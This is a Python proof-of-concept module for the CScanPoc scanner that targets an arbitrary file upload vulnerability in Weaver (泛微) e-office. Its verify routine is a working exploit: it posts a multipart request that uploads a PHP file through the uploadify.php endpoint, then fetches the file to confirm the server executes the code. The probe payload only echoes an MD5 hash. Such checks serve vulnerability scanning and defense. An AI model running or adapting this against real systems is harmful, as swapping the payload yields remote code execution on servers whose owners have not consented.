# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time, re

class Vuln(ABVuln):
    vuln_id = 'weaver_0035' # 平台漏洞编号，留空
    name = '泛微e-office 任意文件上传'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_UPLOAD # 漏洞类型
    disclosure_date = '2015-07-11'  # 漏洞公布时间
    desc = '''
        泛微e-cology 存在任意文件上传漏洞。
        general/weibo/javascript/uploadify/uploadify.php
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '泛微OA'  # 漏洞应用名称
    product_version = '泛微e-office'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'fd65f049-98e5-48f1-bfb4-da4445d47a73'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-26'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer: http://www.wooyun.org/bugs/wooyun-2015-0125592
            hh = hackhttp.hackhttp()
            arg = self.target
            content_type = 'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVO9PKsatIjWx0zBn'
            md5_1 = 'c4ca4238a0b923820dcc509a6f75849b'
            post = '''
                ------WebKitFormBoundaryVO9PKsatIjWx0zBn
                Content-Disposition: form-data; name="Filedata"; filename="test.php"
                Content-Type: text/html

                <?php echo md5(1); ?>
                ------WebKitFormBoundaryVO9PKsatIjWx0zBn--
            '''
            url = arg + '/general/weibo/javascript/lazyUploadify/uploadify.php'
            code, head, res, err, _ = hh.http(url, header=content_type, post=post)

            if code == 200:
                m = re.search(r'attachmentID":([\d]*),', res)
                if m:
                    code, head, res, err, _ = hh.http(arg + 'attachment/' + m.group(1) + '/test.php')
                    if (code==200) and (md5_1 in res):
                        #security_hole('Arbitrarily file upload: ' + url)
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()
